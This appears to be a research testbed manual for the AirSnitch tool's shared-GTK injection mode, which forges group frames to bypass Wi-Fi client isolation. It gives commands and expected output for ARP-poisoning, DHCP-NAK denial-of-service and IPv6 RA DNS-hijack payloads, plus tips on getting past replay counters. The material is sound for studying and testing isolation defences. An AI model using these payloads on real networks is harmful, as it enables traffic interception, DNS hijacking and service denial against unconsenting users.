# `--c2c-gtk-inject` testing & verification manual

How to run each GTK-injection payload and independently confirm the result with
`tcpdump` / `ip` / `resolvectl` — so you trust the tool's "done" message rather
than take it on faith.

All payloads exploit the **same shared-GTK weakness**: when two clients on the
same BSS (even different PSKs / identities / VLANs that are "isolated") receive
the **same GTK**, the attacker can forge *group-addressed downlink frames from
the AP*. The victim's NIC decrypts them with the shared GTK and the host
processes them as if they came from the AP — bypassing client isolation, which
only filters AP-relayed **unicast**.

---

## Background & sources

Two distinct mechanisms — don't conflate them:

- **(A) GTK forgery — BSS-local.** `--c2c-gtk-inject` (all payloads) and
  `--reinject-gtk` forge AP→group frames encrypted with the **per-BSSID GTK**.
  Only a victim on the **same BSSID/GTK** can decrypt them, so this works only
  when attacker and victim share a radio/BSSID. The GTK is per-BSS and group
  frames are re-encrypted with each BSS's own GTK as they cross the DS.
- **(B) Forwarding-plane — can cross pods/BSSIDs.** `--c2c`, `--c2c-eth`,
  `--c2c-ip`, `--c2c-broadcast`, `--c2c-multicast`, `--port-steal(-uplink)`,
  `--c2c-ra-inject` are sent over the attacker's normal station link; the AP /
  bridged backhaul decide reach. Broadcast/multicast crossing to a different
  BSSID is this path (AirSnitch calls it "broadcast reflection"), **not** a
  shared GTK. Whether it crosses pods depends on the L2 bridge/backhaul and the
  AP's group-forwarding config:
  - `dgaf_disable=true` → AP does **not** forward downstream group frames (the
    real block). `false` → forwarded normally.
  - `mcast2ucast=true` → group frames delivered as per-STA **unicast** (still
    delivered; weak isolation, not a block). `false` → normal group frames.

Sources (see the test-matrix workbook's References tab for the full table):

- **AirSnitch**, *Demystifying and Breaking Client Isolation in Wi-Fi Networks*,
  NDSS 2026 — §IV-B (GTK/IGTK abuse), §V (broadcast reflection, cross-BSSID),
  §VIII-C (mitigations: per-user VLANs defeat the whole table; DGAF-disable only
  partially). DOI 10.14722/ndss.2026.241282 ·
  https://papers.mathyvanhoef.com/ndss2026-airsnitch.pdf
- **RFC 9119** §4 / §4.6 — group-frame forwarding, Proxy ARP, multicast-to-unicast
  (DMS). https://www.rfc-editor.org/rfc/rfc9119.html
- **hostapd** `disable_dgaf` (Passpoint/HS2.0, 802.11u — DGAF is a Wi-Fi Alliance
  construct, not core 802.11). https://w1.fi/cgit/hostap/tree/hostapd/hostapd.conf
- **OpenSync** `Wifi_VIF_Config` fields `mcast2ucast` / `dgaf_disable` (plain
  booleans, no schema prose; semantics from the hostapd/QCA mapping).
  https://raw.githubusercontent.com/plume-design/opensync/master/interfaces/opensync.ovsschema

> Not spec-guaranteed: that `mcast2ucast=false` + `dgaf_disable=false` makes
> broadcast/multicast reach a victim on a **different pod/BSSID**. That is a
> testbed observation with a consistent mechanism (normal group forwarding +
> bridged L2), not a documented per-VIF-flag behavior. The documented block is
> `dgaf_disable=true` (and/or per-user VLANs).

---

## Testbed used in the examples

| Role | Interface | MAC | IP |
|------|-----------|-----|----|
| Victim (home user) | `wlx40ed00a2c6f9` | `40:ed:00:a2:c6:f9` | `192.168.40.70` |
| Attacker (guest)   | `wlx941865549111` | `94:18:65:54:91:11` | `192.168.40.210` |
| Gateway / DHCP+DNS | (router)          | `1a:0c:7a:3c:d4:be` | `192.168.40.1` |
| BSSID              | `2a:0c:7a:3c:d3:47` | — | ch 44 / 5220 MHz |

Replace these with your own values. The gateway IP/MAC and the victim's IP are
learned automatically by the tool during the run and printed in its log.

---

## Where to watch, and why

During `--c2c-gtk-inject` the tool:

1. Connects **both** interfaces as normal stations and reads the GTK from each.
2. **Stops the attacker's** wpa_supplicant and switches the **attacker interface
   into monitor mode**, tuned to the victim's channel, to transmit the forged
   frames.
3. Leaves the **victim interface associated the whole time**.

Consequences for verification:

- **Watch the victim interface** (`wlx40ed00a2c6f9`). It stays in managed mode and
  associated, so mac80211 decrypts the injected group frames with the GTK and
  hands them up as ordinary Ethernet frames. `tcpdump` there is the ground truth:
  **if a frame shows up in `tcpdump`, it was received and successfully decrypted
  with the shared GTK** — regardless of whether the host's firewall/stack later
  acts on it.
- The **attacker interface is in monitor mode** while injecting, so `tcpdump`
  there shows raw 802.11 (your own encrypted TX). Useful only to confirm you are
  transmitting, not to confirm victim reception.
- **Optional third NIC**: if you have a spare adapter, put it in monitor mode on
  the victim's channel to observe the encrypted frames over the air
  (`tcpdump -i mon0 -nn -e type data`). Not required.

**Start the victim-side `tcpdump` first, in its own terminal, and leave it
running** for the whole test — injection happens only briefly, near the end of
the run.

Flags used below:
- `-nn` no name/port resolution, `-e` show link-layer (so you see the group
  destination MAC and the spoofed Ethernet source), `-vv` full detail (for DHCP
  and RA option contents).

---

## 1. `icmp` — reachability probe (default)

Confirms the victim receives and decrypts an injected group frame.

**Run:**
```bash
./airsnitch.py wlx40ed00a2c6f9 --c2c-gtk-inject wlx941865549111 --gtk-inject-payload icmp
```

**Attacker sends:** a broadcast (L2 `ff:ff:ff:ff:ff:ff`) `from-DS` data frame
carrying `IP(src=192.168.40.1, dst=192.168.40.70)/ICMP echo-request` with the
payload `icmp_ping_test`.

**Watch the victim:**
```bash
tcpdump -i wlx40ed00a2c6f9 -nn -e icmp
```

**Expected:**
```
... ff:ff:ff:ff:ff:ff, ethertype IPv4 ... 192.168.40.1 > 192.168.40.70: ICMP echo request ...
```
Seeing the echo **request arrive** = shared-GTK decryption worked = isolation
bypassed. If the victim's stack also answers, you'll additionally see an outgoing
`192.168.40.70 > 192.168.40.1: ICMP echo reply`. The reply is a bonus, not the
proof — ICMP can be firewalled/rate-limited, so rely on arrival of the request.

---

## 2. `arp` — ARP cache poisoning (MITM; strongest observable PoC)

Tells the victim the gateway IP is at the **attacker's** MAC, so the victim
sends its upstream traffic to the attacker.

**Run:**
```bash
./airsnitch.py wlx40ed00a2c6f9 --c2c-gtk-inject wlx941865549111 --gtk-inject-payload arp
```

**Attacker sends:** a broadcast `from-DS` frame carrying
`ARP is-at: 192.168.40.1 is-at 94:18:65:54:91:11` (802.11 SA / Ethernet source =
attacker).

**Watch the victim (packet):**
```bash
tcpdump -i wlx40ed00a2c6f9 -nn -e arp
```
**Expected:**
```
... 94:18:65:54:91:11 ... ARP, Reply 192.168.40.1 is-at 94:18:65:54:91:11 ...
```

**Watch the victim (state — the real impact):**
```bash
# before the test
ip neigh show 192.168.40.1
#   192.168.40.1 ... lladdr 1a:0c:7a:3c:d4:be REACHABLE     <- real gateway

# after the inject
ip neigh show 192.168.40.1
#   192.168.40.1 ... lladdr 94:18:65:54:91:11 ...           <- now the attacker
```
If the neighbour entry flips to the attacker's MAC, you've demonstrated the
isolation bypass **with impact**. No reply packet is needed.

> Caveat: Linux updates an **existing** neighbour entry from an unsolicited reply
> but by default won't create a brand-new one (`net.ipv4.conf.*.arp_accept=0`).
> Make sure the victim has talked to the gateway first (e.g. `ping -c1
> 192.168.40.1` on the victim) so the entry exists, then inject.

---

## 3. `dhcp-nak` — lease denial-of-service

Spoofs a DHCP NAK from the server to make the victim drop its lease.

**Run:**
```bash
./airsnitch.py wlx40ed00a2c6f9 --c2c-gtk-inject wlx941865549111 --gtk-inject-payload dhcp-nak
# optionally match the victim's in-flight request XID:
#   --gtk-inject-dhcp-xid 0x6f8b2c1a
```

**Attacker sends:** a broadcast `from-DS` frame carrying
`IP(src=192.168.40.1, dst=255.255.255.255)/UDP 67->68/BOOTP op=2/DHCP NAK`
(`server_id=192.168.40.1`).

**Watch the victim (packet):**
```bash
tcpdump -i wlx40ed00a2c6f9 -nn -e -vv '(port 67 or port 68)'
```
**Expected:**
```
... 192.168.40.1.67 > 255.255.255.255.68: BOOTP/DHCP, Reply ...
      DHCP-Message (53), length 1: NAK ...
```

**Watch the victim (state):** a successful NAK makes the DHCP client log a
renew/rebind failure and deconfigure the address:
```bash
journalctl -u 'NetworkManager*' -u 'dhclient*' -f     # watch for NAK / lease loss
ip -4 addr show wlx40ed00a2c6f9                        # 192.168.40.70 should disappear
```

> Caveat: a NAK is normally honoured **only when its XID matches the victim's
> in-flight DHCP request**, which we don't know up front. Seeing the NAK **arrive**
> in `tcpdump` already proves the shared-GTK injection reached the victim; whether
> the client acts on it depends on timing/XID. Capture the XID from an observed
> renewal and pass it via `--gtk-inject-dhcp-xid` for a reliable drop.

---

## 4. `ra` — IPv6 Router Advertisement / RDNSS DNS hijack

Injects an ICMPv6 RA with a malicious recursive-DNS option, over the shared GTK,
so it bypasses isolation (unlike `--c2c-ra-inject`, which uses the attacker's own
station link).

**Run:**
```bash
./airsnitch.py wlx40ed00a2c6f9 --c2c-gtk-inject wlx941865549111 \
    --gtk-inject-payload ra --ra-inject-dns 2001:db8:dead:beef::53
# RA flags if the real network is stateful: --ra-managed --ra-other
```

**Attacker sends:** an IPv6 all-nodes multicast frame (L2 `33:33:00:00:00:01`)
carrying `IPv6(src=fe80::dead:beef)/ICMPv6 Router Advertisement` with an
`RDNSS = 2001:db8:dead:beef::53` option.

**Watch the victim (packet):**
```bash
tcpdump -i wlx40ed00a2c6f9 -nn -e -vv 'icmp6 && ip6[40] == 134'
```
(`134` = ICMPv6 type Router Advertisement.)

**Expected:**
```
... 33:33:00:00:00:01, ethertype IPv6 ... fe80::dead:beef > ff02::1: ICMP6, router advertisement ...
      rdnss option ... 2001:db8:dead:beef::53 ...
```

**Watch the victim (state — the real impact):**
```bash
resolvectl status                 # the attacker's RDNSS should appear as a DNS server
resolvectl dns wlx40ed00a2c6f9
```

> Caveat: the victim must have IPv6 enabled and accept RAs
> (`net.ipv6.conf.<iface>.accept_ra` = 1 or 2, and `accept_ra_rtr_pref` for RDNSS
> handling). On systemd-networkd/NetworkManager this is usually on by default for
> client interfaces.

---

## Reading the tool's own output

Regardless of payload, a healthy run prints:

```
>>> The victim's GTK is  (<hex> 1 <seq>).
>>> The attacker's GTK is (<hex> 1 <seq>).      # SAME hex as victim == shared GTK (the precondition)
>>> No IGTK installed (PMF not active ...)       # or ">>> PMF active ... IGTK ... 4 ..." under SAE/PFA
>>> Tuning injection interface to victim frequency 5220 MHz.   # channel auto-tune (needed off ch 1)
>>> GTK-inject payload = <kind>: <description>
Injecting frame 5 times: <Dot11 ... key_id=1 ...>
```

Checklist if nothing appears on the victim:

1. **Same GTK hex** on both lines? If not, the clients aren't sharing a group key
   (nothing to exploit).
2. **`key_id=1` (or 2)** in the injected `Dot11CCMP`? `key_id=4/5` means the IGTK
   leaked in — rebuild wpa_supplicant with the patched `wpas_glue.c`.
3. **"Tuning injection interface to victim frequency N MHz"** present and matching
   the victim's channel? Without it the frames go out on the wrong channel.
4. Victim `tcpdump` started **before** the inject phase and watching the **victim**
   interface (not the attacker's monitor-mode interface)?
5. Injection is 5 un-acked broadcast frames — if the air is noisy, re-run.
6. **CCMP replay**: the victim drops any group frame whose PN is at or below its
   current GTK replay counter, and each injection advances that counter — so
   re-running at the same PN fails ("first time yes, second time no"). The tool
   handles this automatically: it provokes a group frame (via a victim broadcast)
   and injects just above the observed live PN (`>>> Observed live GTK PN N … PN N+1`);
   if no group frame is seen it falls back to a PN that **auto-increments across
   runs**, remembered per-BSSID in `/tmp/airsnitch-gtkpn-<bssid>.state`. You can
   still force a value with `--gtk-inject-pn <N>` or widen the learn window with
   `--gtk-inject-pn-timeout`. A good sign a drop was a replay (not isolation) is
   that the forged frame never appears in the victim's `tcpdump` even though the
   GTK hex matches and `key_id=1`. Each run now sends 5 copies at consecutive PNs
   (N..N+4), so you may see up to 5 — or 1 if the later ones are lost on air.

   > Setting a high `--gtk-inject-pn` poisons the victim's replay counter, so it
   > may drop subsequent *legitimate* AP broadcast/multicast frames until the AP
   > catches up — itself a demonstration of group-key injection, but it can look
   > like a broadcast outage.
